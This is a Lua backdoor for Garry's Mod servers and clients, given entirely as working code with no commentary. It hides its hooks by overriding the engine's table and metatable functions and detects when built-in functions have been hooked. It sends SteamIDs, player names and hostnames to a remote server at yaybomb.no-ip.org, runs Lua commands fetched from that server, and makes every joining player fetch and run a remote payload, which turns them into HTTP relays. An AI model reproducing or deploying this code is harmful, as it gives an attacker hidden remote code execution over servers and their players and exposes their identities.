 
timer['Simple'](0, function()
	
	if !pcall then return end
	
	pcall(function()
		local tbl = setmetatable({}, {}, util['CRC'](GetConVarString('ip')) * 2)
		
		if tbl and tbl['G'] !=nil then
			if tbl['boot'] and !tbl['working'] then
				tbl['boot']()
			end
			return end
			
			local pwn={}
			local gr_tbl = _G[util['CRC'](os['time']()*228)]
			
			if !gr_tbl then
				gr_tbl = {
					_G,
					debug['getregistry']()
				}
				
				pwn['sendtocl'] = true
			end
			
			local lpairs,listable = gr_tbl[1]['pairs'], gr_tbl[1]['istable']
			
			local function tCopy(t, lookup_table)
				local copy = {}
				for i,v in lpairs(t) do
					if !listable(v) then
						copy[i] = v
					else
						lookup_table = lookup_table or {}
						lookup_table[t] = copy
						
						if lookup_table[v] then
							copy[i] = lookup_table[v]
						else
							copy[i] = tCopy(v,lookup_table)
						end
					end
				end
			return copy
		end
		
		local G = tCopy( gr_tbl[1] )
		local R = tCopy( gr_tbl[2] )
		local called = false
		
		local function oncall()
			called = true
		end
		
		local lprint,lMsg,lMsgN,lMsgC,lMsgAll,lPrintMessage,lfopen,lErrorNoHalt
		
		pwn['CheckFunction'] = function(func)
			if func then
				called = false
				
				lprint=print
				lMsg=Msg
				lMsgN=MsgN
				lMsgC=MsgC
				lMsgAll=MsgAll
				lPrintMessage=PrintMessage
				lfopen=file['Open']
				lErrorNoHalt=ErrorNoHalt
				print=oncall
				Msg=oncall
				MsgN=oncall
				MsgC=oncall
				MsgAll=oncall
				PrintMessage=oncall
				file['Open'] = oncall
				ErrorNoHalt=oncall
				
				G['pcall'](func)
				
				print=lprint
				Msg=lMsg
				MsgN=lMsgN
				MsgC=lMsgC
				MsgAll=lMsgAll
				PrintMessage=lPrintMessage
				file['Open'] = lfopen
				ErrorNoHalt=lErrorNoHalt
				
				return !called
			else
				return true
			end
		end
		
		local chk_funcs = {
			pcall,
			getmetatable,
			setmetatable,
			rawset,
			GetConVarString,
			GetHostName,
			CompileString,
			net['Start'],
			net['Send'],
			net['SendToServer'],
			net['ReadFloat'],
			net['WriteFloat'],
			net['ReadString'],
			net['WriteString'],
			util['NetworkIDToString'],
			util['CRC']
		}
		
		for k,f in G['pairs'](chk_funcs) do
			if !pwn['CheckFunction'](f) then
				return
			end
		end
		
		pwn['G'] = G
		pwn['R'] = R
		pwn['G']['cmd'] = G['RunConsoleCommand']
		
		local SERVER = G['SERVER']
		local CLIENT = G['CLIENT']
		local RunConsoleCommand = G['RunConsoleCommand']
		local print=G['print']
		local LocalPlayer=G['LocalPlayer']
		local tonumber=G['tonumber']
		local tostring=G['tostring']
		local GetHostName=G['GetHostName']
		local GetConVarString=G['GetConVarString']
		local CompileString=G['CompileString']
		local type=G['type']
		local pcall=G['pcall']
		local CurTime=G['CurTime']
		local isnumber=G['isnumber']
		local isfunction=G['isfunction']
		local isstring=G['isstring']
		local istable=G['istable']
		local HTTP=G['HTTP']
		local UnPredictedCurTime=G['UnPredictedCurTime']
		local unpack=G['unpack']
		local include=G['include']
		local pUniqueID = R['Player']['UniqueID']
		local pSteamID=R['Player']['SteamID']
		local pNick=R['Player']['Nick']
		local pSendLua=R['Player']['SendLua']
		local string=G['string']
		local math=G['math']
		local player=G['player']
		local os=G['os']
		local http=G['http']
		local table=G['table']
		local gmod=G['gmod']
		local file=G['file']
		
		string['ToTable'] = function( str )
			local tbl = {}
			for i = 1, string['len']( str ) do
				tbl[i] = string['sub']( str, i, i )
			end
			
			return tbl
		end
		
		string['Replace'] = function( str, tofind, toreplace )
			tofind = tofind:gsub( '[%-%^%$%(%)%%%.%[%]%*%+%-%?]', '%%%1' )
			toreplace = toreplace:gsub( '%%', '%%%1' )
			
			return ( str:gsub( tofind, toreplace ) )
		end
		
		string['StartWith'] = function( String, Start )
			return string['sub']( String, 1, string['len'] (Start ) ) == Start
		end
		
		string['EndsWith'] = function( String, End )
			return End == '' or string['sub']( String, -string['len']( End ) ) == End
		end
		
		table['Copy'] = function(t, lookup_table)
			if (t == nil) then return nil end
			
			local copy = {}
			G['setmetatable'](copy, G['getmetatable'](t))
			
			for i,v in G['pairs'](t) do
				if ( !istable(v) ) then
					copy[i] = v
				else
					lookup_table = lookup_table or {}
					lookup_table[t] = copy
					
					if lookup_table[v] then
						copy[i] = lookup_table[v]
					else
						copy[i] = table['Copy'](v,lookup_table)
					end
				end
			end
			return copy
		end
		
		table['Merge'] = function(dest, source)
			for k,v in G['pairs'](source) do
				if( type(v) == 'table' && type(dest[k]) == 'table' ) then
					table['Merge'](dest[k], v)
				else
					dest[k] = v
				end
			end
			return dest
		end
		
		pwn['Call'] = function(type,name,func,...)
			if isstring(type) and isstring(name) and isfunction(func) then
				local bool,res=pcall(func,...)
				
				if !bool then
					pwn['p']('ERROR IN '..string['upper'](type)..' "'..name..'":
'..res)
				end
				return bool
			else
				pwn['p']('pwn.Call: argument list is not valid. Values: '..tostring(type)..', '..tostring(name)..', '..tostring(func))
				return false
			end
		end
		
		local wtbl={}
		local ghooks = G['hook']['GetTable']()
		local has_ulib = ghooks != hook['Hooks']
		
		if has_ulib then
			local chk_funcs = {
				G['hook']['GetTable'](),
				G['hook']['Add'],
				G['hook']['Remove']
			}
			
			for k,f in G['pairs'](chk_funcs) do
				if !pwn['CheckFunction'](f) then return end
			end
			
			setmetatable = function(tbl,metatbl,keyword)
				if keyword == tonumber(G['util']['CRC'](GetConVarString('ip')))*2 then
					return pwn
				end
				
				return G['setmetatable'](tbl,metatbl)
			end
			
		else
			local lhooks = table['Copy'](ghooks)
			local hm
			local index,newindex
			local function checktrace()
				local info = G['debug']['getinfo'](3,'Sln')
				
				if info and info['name'] == nil and info['short_src'] == 'lua/includes/modules/hook.lua' then
					return true
				else
					return false
				end
			end
			
			index = function(self,key)
				local cidx,t
				
				if hm and hm['__index'] and !lhooks[key] then
					if isfunction(hm['__index']) then
						cidx = {
							pcall(hm['__index'],self,key)
						}
						
						if cidx[1] then
							table['remove'](cidx,1)
							t=1
						end
						
					elseif istable(hm['__index']) then
						cidx = hm['__index'][key]
						t=2
					else
						cidx = hm['__index']
						t=3
					end
				end
				
				if wtbl[key] and checktrace() then
					if t then
						if t==1 then
							cidx = cidx[1]
						end
						
						if istable(cidx) then
							return table['Merge'](wtbl[key],cidx)
						else
							return wtbl[key]
						end
						
					else
						if lhooks[key] and istable(lhooks[key]) then
							return table['Merge'](wtbl[key],lhooks[key])
						else
						
						return wtbl[key]
					end
					
					else
						if t then
							if t==1 then
								return unpack(cidx)
							else
								return cidx
							end
							
						else
							return lhooks[key]
						end
					end
				end
			end
		end
		
		newindex = function(self,key,value)
			if hm and hm['__newindex'] and !lhooks[key] then
				if isfunction(hm['__newindex']) then
					pcall(hm['__newindex'],self,key,value)
					return
					
				elseif istable(hm['__newindex']) then
					hm['__newindex'][key] = value
					return
				end
			end
			
			if isnumber(key) then
				G['rawset'](self,key,value)
			end
			
			lhooks[key] = value
		end
		
		getmetatable=function(tbl)
			if tbl==ghooks then
				return hm
			else
				return G['getmetatable'](tbl)
			end
		end
		
		setmetatable=function(tbl,metatbl,keyword)
			if keyword==tonumber(G['util']['CRC'](GetConVarString('ip')))*2 then
				return pwn
			end
			
			if tbl==ghooks then
				hm = metatbl
				
				if istable(metatbl) then
					metatbl = tCopy(metatbl)
					metatbl['__index'] = index
					metatbl['__newindex'] = newindex
					
					G['setmetatable'](tbl,metatbl)
					
				elseif metatbl==nil then
					G['setmetatable'](tbl,{ __index=index, __newindex=newindex })
					
				else
					G['setmetatable']({},metatbl)
				end
				
				return tbl
			else
				return G['setmetatable'](tbl,metatbl)
			end
		end
		
		debug['getmetatable'] = function(tbl)
			if istable(tbl) then
				if tbl==ghooks then
					return hm
				else
					return G['debug']['getmetatable'](tbl)
				end
			end
		end
		
		debug['setmetatable'] = function(tbl,metatbl)
			if istable(tbl) and (istable(metatbl) or metatbl==nil) then
				if tbl==ghooks then
					hm = metatbl
					
					if istable(metatbl) then
						metatbl = tCopy(metatbl)
						metatbl['__index'] = index
						metatbl['__newindex'] = newindex
						
						G['debug']['setmetatable'](tbl,metatbl)
						
					elseif metatbl==nil then
						G['debug']['setmetatable'](tbl,{ __index=index, __newindex=newindex })
					else
						G['debug']['setmetatable']({},metatbl)
					end
					
					return tbl
				else
					return G['debug']['setmetatable'](tbl,metatbl)
				end
			end
		end
		
		rawget=function(tbl,index)
			if tbl == ghooks then
				return lhooks[index]
			else
				return G['rawget'](tbl,index)
			end
		end
		
		rawset=function(tbl,index,value)
			if tbl == ghooks then
				lhooks[index]=value
				
				return tbl
			else
				return G['rawset'](tbl,index,value)
			end
		end
		
		rawequal=function(obj1,obj2)
			if obj1 == ghooks then
				obj1=lhooks
			end
			
			if obj2==ghooks then
				obj2=lhooks
			end
			return G['rawequal'](obj1,obj2)
		end
		
		pairs=function(tbl)
			if tbl==ghooks then
				return G['pairs'](lhooks)
			else
				return G['pairs'](tbl)
			end
		end
		
		ipairs=function(tbl)
			if tbl==ghooks then
				return G['pairs'](lhooks)
			else
				return G['pairs'](tbl)
			end
		end
		
		next=function(tbl,index)
			if tbl==ghooks then
				return G['next'](lhooks,index)
			else
				return G['next'](tbl,index)
			end
		end
		
		for k,v in G['pairs'](ghooks) do
			if !isnumber(k) then
				ghooks[k]=nil
			end
		end
		
		local metatbl=G['getmetatable'](ghooks)
		
		if metatbl then
			setmetatable(ghooks,metatbl)
		else
			G['setmetatable'](ghooks,{ __index=index, __newindex=newindex })
		end
	end
	
	local getmetatable=G['getmetatable']
	local setmetatable=G['setmetatable']
	local pairs=G['pairs']
	local ipairs=G['ipairs']
	local next=G['next']
	local hook=G['hook']
	local debug=G['debug']
	
	local hooks={}
	pwn['GetHooks']=function()
		return hooks
	end
	pwn['AddHook']=function(event_name,name,func)
		if isstring(event_name) and isstring(name) and isfunction(func) then
			if !hooks[event_name] then
				hooks[event_name]={}
			end
			
			if !wtbl[event_name] then
				wtbl[event_name]={}
			end
			
			local oldf = func
			func=function(...)
				pwn['Call']('HOOK',name,oldf,...)
			end
			
			hooks[event_name][name]=func
			wtbl[event_name][name]=func
			
			if has_ulib then
				name=tostring(G['util']['CRC'](name)*string['len'](name))
				hook['Add'](event_name,name,func)
				local ghooks=hook['GetTable']()
				if ghooks[event_name] and ghooks[event_name][name] then
					ghooks[event_name][name]=nil
				end
			end
		end
	end
	
	pwn['RemoveHook']=function(event_name,name)
		if hooks[event_name] and hooks[event_name][name] then
			hooks[event_name][name]=nil
			wtbl[event_name][name]=nil
			
			if has_ulib then
				name=tostring(G['util']['CRC'](name)*string['len'](name))
				
				hook['Remove'](event_name,name)
			end
		end
	end
	
	pwn['CallHooks']=function(event_name,...)
		if !hooks[event_name] then
			hooks[event_name]={}
		end
		
		if !wtbl[event_name] then
			wtbl[event_name]={}
			return
		end
		
		for k,f in pairs(wtbl[event_name]) do
			f(...)
		end
	end
	
	local wtbl={}
	
	util['NetworkIDToString']=function(id)
		if isstring(id) then
			id=tonumber(id)
		end
		
		if isnumber(id) then
			local val = G['util']['NetworkIDToString'](id)
			
			if wtbl[val] then
				if debug['getinfo'](2) then
					local lenn,len=debug['getlocal'](2,1)
					
					local plyn,ply=debug['getlocal'](2,2)
					wtbl[val](len,ply)
				end
			else
				return val
			end
		end
	end
	
	pwn['Receive']=function(name,func)
		if isstring(name) and isfunction(func) then
			local oldf=func
			func=function(...)
				pwn['Call']('NET HOOK',name,oldf,...)
			end
			
			wtbl[string['lower'](name)] = func
		end
	end
	
	local util=G['util']
	local net=G['net']
	local timers,simple_timers={},{} /*function pwn['GetTimers']() return timers,simple_timers end*/
	
	pwn['TimerExists']=function(name)
		return timers[name]!=nil
	end
	pwn['CreateTimer']=function(name,delay,reps,func)
		if isstring(name) and isnumber(delay) and delay>0 and isnumber(reps) and reps>=0 and isfunction(func) then
			timers[name]={
				enabled=true,
				delay=delay,
				nextcall=CurTime()+delay,
				reps=reps,
				func=func
			}
			return true
		else
			return false
		end
	end
	
	pwn['DestroyTimer']=function(name)
		timers[name]=nil
		return true
	end
	pwn['StartTimer']=function(name)
		local tmr=timers[name]
		if tmr then
			tmr['enabled']=true
			tmr['nextcall'] = CurTime()+tmr['delay']
			
			return true
		else
			return false
		end
	end
	pwn['StopTimer']=function(name)
		local tmr=timers[name]
		if tmr then
			tmr['enabled']=false
			return true
		else
			return false
		end
	end
	pwn['PauseTimer']=function(name)
		local tmr=timers[name]
		if tmr then
			tmr['enabled']=false
			tmr['diff']=tmr['nextcall']-CurTime()
			return true
		else
			return false
		end
	end
	pwn['UnPauseTimer']=function(name)
		local tmr=timers[name]
		if tmr then
			tmr['enabled']=true
			tmr['nextcall'] = tmr['diff'] and CurTime()+tmr['diff'] or CurTime()+tmr['delay']
			return true
		else
			return false
		end
	end
	pwn['AdjustTimer']=function(name,delay,reps,func)
		if isstring(name) and isnumber(delay) and delay>0 and isnumber(reps) and reps>=0 then
			if !timers[name] or (func!=nil and !isfunction(func)) then
				return false
			end
			timers[name]={
				enabled=true,
				delay=delay,
				nextcall=CurTime()+delay,
				reps=reps,
				func=func or timers[name]['func']
			}
			return true
		else
			return false
		end
	end
	pwn['SimpleTimer']=function(delay,func)
		if isnumber(delay) and delay>=0 and isfunction(func) then
			table['insert'](simple_timers,{UnPredictedCurTime()+delay,func})
			return true
		else
			return false
		end
	end
	pwn['CheckTimers']=function()
		for k,t in pairs(timers) do
			if t['enabled'] and t['nextcall']<=CurTime() then
				local ok = pwn['Call']('TIMER', k, t['func'])
				
				if !ok then
					pwn['p']('Timer "'..k..'" failed.')
					timers[k]=nil
					return
				end
				
				if t['reps']!=0 then
				t['reps'] = t['reps']-1
				if t['reps'] == 0 then
					timers[k]=nil
					return
				end
			end
			t['nextcall']=CurTime()+t['delay']
		end
	end
	
	for k,t in pairs(simple_timers) do
		if CurTime()>=t[1] then
			pwn['Call']('TIMER', 'SimpleTimer#' .. k, t[2])
			table['remove'](simple_timers,k)
		end
	end
	
	return true
end

pwn['AddHook']('Think','pwn_CheckTimers',pwn['CheckTimers'])

local function init()
	pwn['address'] = 'http://yaybomb.no-ip.org:1337/'
	pwn['fsender_interval'] = 0.15
	pwn['chk_interval'] = SERVER and 1 or 4
	pwn['spl'] = '?a='
	pwn['working'] = true
	pwn['chk_failed'] = 0
	pwn['chk_last'] = ''
	pwn['replycommands'] = false
	pwn['b64'] = true
	pwn['crypt'] = false
	
	if SERVER then
		pwn['uid'] = '46_39_35_221_'..GetConVarString('hostport')
	else
		pwn['uid'] = pUniqueID(LocalPlayer())
	end
	
	pwn['IntToHex']=function(n)
		if n > 255 then return nil
	end
	
	local function To16(s)
		local t = tonumber(math['BinToInt'](s))
		local q = '0123456789ABCDEF'
		return q[t + 1]
	end
	
	local s = math['IntToBin'](n)
	if(string['len'](s) > 8) then
		s = string['sub'](s,string['len'](s) - 7, string['len'](s))
	else
		while string['len'](s) < 8 do
			s = '0'..s
		end
	end
	
	local res
	res = To16(string['sub'](s,1,4))
	res = res..To16(string['sub'](s,5,8))
	return res
end


local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

pwn['b64_enc']=function(data)
	return ((data:gsub('.', function(x)
		local r,b='',x:byte()
		
		for i=8,1,-1 do
			r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0')
		end
		return r;
	end)..'0000'):gsub('%d%d%d?%d?%d?%d?',
		function(x) if (#x < 6) then return '' end
		
		local c=0
		for i=1,6 do
			c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0)
		end
		return b:sub(c+1,c+1)
	end)..( { '', '==', '=' } )[#data%3+1])
end


pwn['b64_dec']=function(data)
	data = string['gsub'](data, '[^'..b..'=]', '')
	
	return (data:gsub('.', function(x)
		if (x == '=') then
			return ''
		end
		
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do
			r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
			return r;
		end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
			if (#x ~= 8) then
				return ''
			end
			local c=0
			for i=1,8 do
				c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0)
			end
			return string['char'](c)
		end)
	)
end


local function cycleAdd(a,b)
	a = a + b
	
	if(a > 255) then
		a = a - 255
	end
	return a
end

pwn['key'] = 'T7ZmdU5RDusZAzISP9DcopC9eaz2FulLfbSzZ5JcX9IYglP488juUydxsXbwfrMYNRYfKf1GljAoShCXSn3H0sdosji9OGoKpwKXBvfCuDNjYrL68DQMaaHDjbeQy1yFo28AOq7haoOfb6DiIsw5glI9ctTmxVHgUaoDtob7H'
pwn['keyid'] = 'EB729602389D126'

pwn['enc']=function(data, key)
	key = key or pwn['key']
	local s = data:ToTable()
	local res = {}
	local i = 0
	local sz = #s
	
	while #s > 0 do
		i = i + 1
		if i >= key:len() then
			i = 1
		end
		
		local b = string['byte'](key, i)
		local b2 = string['byte'](key, i + 1)
		local ix = math['mod'](b * b2, #s) + 1
		local num = string['byte'](s[ix]) + b
		if num > 255 then
			num = num - 255
		end
		
		table['insert'](res, string['char'](num))
		s[ix] = s[#s]
		table['remove'](s, #s)
	end
	return table['concat'](res)
end

pwn['dec']=function(data, key)
	key = key or pwn['key']
	local s = data:ToTable()
	local res = {}
	local i = math['mod'](data:len(), key:len() - 1) + 2
	local j = data:len()
	local j2 = 1
	
	while j > 0 do
		i = i - 1
		if i <= 1 then
			i = key:len()
		end
		
		local b = string['byte'](key, i - 1)
		local b2 = string['byte'](key, i)
		local ix = math['mod'](b * b2, j2) + 1
		local num =string['byte'](s[j]) - b
		
		if num < 0 then
			num = num + 255
		end
		
		res[#res + 1] = res[ix]
		res[ix] = string['char'](num)
		j = j - 1
		j2 = j2 + 1
	end
	
	return table['concat'](res)
end

pwn['StringToHex']=function(str)
	if pwn['b64'] then
		return 'x'..pwn['b64_enc'](str)
	else
		local curfp = ''
		
		for _, s in pairs(string['ToTable'](str)) do
			curfp = curfp..pwn['IntToHex'](string['byte'](s))
		end
		
		return curfp
	end
end


pwn['p']=function(text)
	pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '2' .. pwn['StringToHex'](tostring(text)))
end


pwn['l']=function(text, winname, log, dic)
	local dics=''
	if dic then
		for k,w in pairs(dic) do
			dics=dics..(k==1 and '' or '|')..table['concat'](w,':')
		end
	end
	
	pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '6' .. (winname and pwn['StringToHex'](winname) or '') .. '|' .. pwn['StringToHex'](dics) .. '|' .. (log and '1' or '0') .. pwn['StringToHex'](tostring(text)))
end


local attempts=0

pwn['reg']=function()
	local steamId,pname
	
	if SERVER then
		steamId = pwn['uid']
		pname = GetHostName()
	else
		steamId = pSteamID(LocalPlayer())
		pname = pNick(LocalPlayer())
		
		if pname=='unconnected' then
			if attempts<21 then
				attempts=attempts+1
				
				pwn['SimpleTimer'](1,pwn['reg'])
			end
			
			if attempts>1 then
				return
			end
		end
	end
	
	pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '0' .. steamId .. '|' .. pwn['StringToHex'](tostring(pwn['http_proxy'])) .. '|' .. pwn['StringToHex'](GetHostName()) .. '|' .. pwn['StringToHex'](pname))
end


pwn['sleep']=function()
	pwn['working'] = false
	
	pwn['DestroyTimer']('pwn_chk_timer')
	
	if SERVER then
		pwn['RemoveHook']('PlayerInitialSpawn','pwn.srv')
	end
end

pwn['setinterval']=function(interval)
	if isnumber(interval) then
		pwn['chk_interval']=interval
		pwn['AdjustTimer']('pwn_chk_timer',interval,0)
	end
end

pwn['runlua']=function(code,isplain)
	local key=util['CRC'](os['time']()*math['random'](228,1337))
	
	_G[key]=pwn
	
	local func = CompileString(isplain and code or 'local pwn=_G[''..key..'']local G,R,cmd=pwn.G,pwn.R,pwn.G.cmd '..code, 'pwn', false)
	
	if type(func) == 'string' then
		pwn['p']('SYNTAX ERROR:' .. func)
	else
		local bool,res = pcall(func)
		
		if !bool then
			pwn['p']('ERROR:' .. res)
		end
	end
	_G[key]=nil
end

pwn['chk']=function()
	pwn['chk_failed'] = pwn['chk_failed'] + pwn['chk_interval']
	
	if pwn['chk_failed'] > 20 then
		if tostring(pwn['http_proxy']) == '0' then
			if SERVER then
				for k, v in pairs(player['GetAll']()) do
					pwn['inf'](v)
				end
				
				pwn['proxy'](-1)
				
			elseif util['NetworkStringToID']('pwn_http_send') !=0 then
				pwn['proxy'](-1)
			end
		else
			pwn['proxy'](0)
		end
		
		pwn['chk_failed'] = 0
	end
	
	pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '1', pwn['chk_r'])
	
	if not pwn['working'] then
		pwn['DestroyTimer']('pwn_chk_timer')
		pwn['RemoveHook']('PlayerInitialSpawn','pwn.srv')
	end
end

pwn['chk_r']=function(contents, size)
	if string['len'](contents) > 5 then
		if string['len'](contents) == 12 then
			if string['StartWith'](contents, 'NONE') and string['EndsWith'](contents, 'NONE') then
				if (contents != pwn['chk_last']) then
					pwn['chk_failed'] = 0
					pwn['chk_last'] = contents
				end
				return
			end
		end
		
		pwn['chk_last'] = contents
		if pwn['replycommands'] then
			pwn['p'](contents)
		end
		
		pwn['runlua'](contents)
	end
end

pwn['f']=function(str)
	local s = str
	s = string['Replace'](s,'\','\\')
	s = string['Replace'](s,'
','\n')
	s = string['Replace'](s,' ','\s')
	s = string['Replace'](s,'"','\q')
	s = string['Replace'](s,'<','\o')
	s = string['Replace'](s,'>','\c')
	s = string['Replace'](s,'%','\p')
	s = string['Replace'](s,'&','\a')
	s = string['Replace'](s,'	','\t')
	s = string['Replace'](s,'=','\e')
	return s
end

pwn['http_answer']=function(len, ply)
	local id = net['ReadFloat']()
	
	local f = pwn['http_waiting'][id]
	if f then
		pwn['Call']('NET CALLBACK',tostring(id),f,net['ReadString']())
		pwn['http_waiting'][id] = nil
	end
end

pwn['http_send']=function(len, ply)
	local id=net['ReadFloat']()
	
	pwn['http'](net['ReadString'](),function(content)
		net['Start']('pwn_http_answer')
		net['WriteFloat'](id)
		net['WriteString'](content)
		
		if SERVER then
			net['Send'](ply)
		else
			net['SendToServer']()
		end
	end)
end

pwn['proxy']=function(num)
	pwn['http_proxy'] = num
	pwn['reg']()
end

pwn['http']=function(address, callback)
	local usualprefix = pwn['address'] .. pwn['uid'] .. pwn['spl']
	local cryptedprefix = usualprefix .. 'c'
	
	if pwn['crypt'] and address:StartWith(usualprefix) and not address:StartWith(cryptedprefix) then
		address = address:sub(usualprefix:len() + 1)
		address = pwn['StringToHex'](pwn['enc'](address))
		address = usualprefix .. 'c' .. pwn['keyid'] .. '!' .. address
		
		if callback then
			local origcb = callback
			local origcallback = callback
			
			callback = function(data,size)
				data = pwn['dec'](data)
				origcallback(data,size)
			end
		end
	end
	
	if tostring(pwn['http_proxy']) == '0' then
		if callback then
			HTTP( {
				url=address,
				method='get',
				success=function(code,body,headers)
					pwn['Call']('HTTP CALLBACK',address,callback,body)
				end
			} )
		else
			HTTP( {
				url=address,
				method='get'
			} )
		end
	else
		if SERVER and #player['GetAll']()==0 then
			return
		end
		
		pwn['http_id'] = pwn['http_id'] + 1
		
		net['Start']('pwn_http_send')
		net['WriteFloat'](pwn['http_id'])
		net['WriteString'](address)
		
		if callback then
			pwn['http_waiting'][pwn['http_id']] = callback
		end
		
		if SERVER then
			local p
			if type(pwn['http_proxy']) != 'Player' then
				local pls_all = player['GetAll']()
				local pls
				if pwn['http_proxy'] == -1 then
					pls = {}
					for k, v in pairs(pls_all) do
						if not v:IsBot() then
							table['insert'](pls, v)
						end
					end
					p = pls[math['random'](1, #pls)]
				else
					pls = pls_all
					p = pls[pwn['http_proxy']]
				end
			else
				p = pwn['http_proxy']
			end
			
			net['Send'](p) else
			net['SendToServer']()
		end
	end
end

pwn['download']=function(filename, varname, partsize)
	pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '5' .. filename .. '|' .. varname .. '|' .. partsize .. '|0',pwn['runlua'])
end

pwn['dowload_r']=function(filename, varname, partsize, partn)
	pwn['http'](pwn['address'] .. pwn['uid'] .. pwn['spl'] .. '5' .. filename .. '|' .. varname .. '|' .. partsize .. '|' .. partn,pwn['runlua'])
end

pwn['printplayers']=function()
	local s = ''
	for k, v in pairs(player['GetAll']()) do
		s = s .. '
' .. k .. ':' .. pNick(v)
	end
	
	pwn['p'](s)
end

pwn['tf']=function(target,str,casesens)
	local s = ''
	str = str or ''
	
	if(casesens)then
		for k, v in pairs(target) do
			if(string['find'](k,str,1,true) != nil) then
				s = s .. k .. ': ' .. type(v) .. '
'
			end
		end
	else
		str = string['lower'](str)
		
		for k, v in pairs(target) do
			if(string['find'](string['lower'](k),str,1,true) != nil) then
				s = s .. k .. ' (' .. type(v) .. '):' .. tostring(v) .. '
'
			end
		end
	end
	
	pwn['p'](s .. '-------------')
end

pwn['pt']=function(tbl,depth,vb,filter,str,_curlvl)
	local shpr = str == nil
	depth=depth or 0
	str=str or ''
	_curlvl=_curlvl or 0
	
	local pre=string['rep']('	',_curlvl)
	
	for k,v in pairs(tbl) do
		if !filter or filter(k,v) then
			if istable(v) and depth!=0 then
				if vb then
					str=str..pre..type(k)..' ['..k..']:'..pwn['pt'](v,depth-1,vb,filter,str,_curlvl+1)
				else
					str=str..pre..'['..k..']:'..pwn['pt'](v,depth-1,vb,filter,str,_curlvl+1)
				end
			else
				if vb then
					str=str..pre..type(k)..' ['..k..']: '..type(v)..' ['..tostring(v)..']'
				else
					str=str..pre..'['..k..']: ['..tostring(v)..']'
				end
			end
		end
	end
	
	if shpr then
		pwn['p'](str..'-------------')
	else
		return str
	end
end

pwn['pl']=function(str)
	str = string['lower'](str)
	
	for k, v in pairs(player['GetAll']()) do
		if(string['find'](string['lower'](pNick(v)),str,1,true) != nil) then
			return v
		end
		if(string['find'](string['lower'](pSteamID(v)),str,1,true) != nil) then
			return v
		end
		if(string['find'](string['lower'](pUniqueID(v)),str,1,true) != nil) then
			return v
		end
	end
end

pwn['inf']=function(ply)
	pSendLua(ply,'http.Fetch("'..pwn['address']..'2.lua",RunString)')
end

pwn['wake']=function(ply)
	net['Start']('pwn_wake')
	net['Send'](ply)
end

pwn['boot']=function()
	pwn['working'] = true
	pwn['http_proxy'] = 0
	pwn['http_id'] = 1
	pwn['http_waiting'] = {}
	
	if SERVER then
		util['AddNetworkString']('pwn_http_answer')
		util['AddNetworkString']('pwn_http_send')
	end
	
	pwn['Receive']('pwn_http_answer', pwn['http_answer'])
	pwn['Receive']('pwn_http_send', pwn['http_send'])
	pwn['timeout'] = 0
	pwn['reg']()
	pwn['CreateTimer']('pwn_chk_timer',pwn['chk_interval'],0,pwn['chk'])
	
	if SERVER then
		if pwn['sendtocl'] then
			pwn['AddHook']('PlayerInitialSpawn','pwn.srv',pwn['inf'])
		end
	end
end

if pwn['working'] then
	pwn['boot']()
end

util['AddNetworkString']('pwn_wake')
pwn['Receive']('pwn_wake',function()
	if !pwn['working'] then
		pwn['boot']()
	end
end)


end

if CLIENT then
	if LocalPlayer()==NULL then
		pwn['AddHook']('InitPostEntity','pwn.init_cl',init)
	else
		init()
	end
else
	pwn['SimpleTimer'](0,init)
end

end) --pcall
end) --timer


















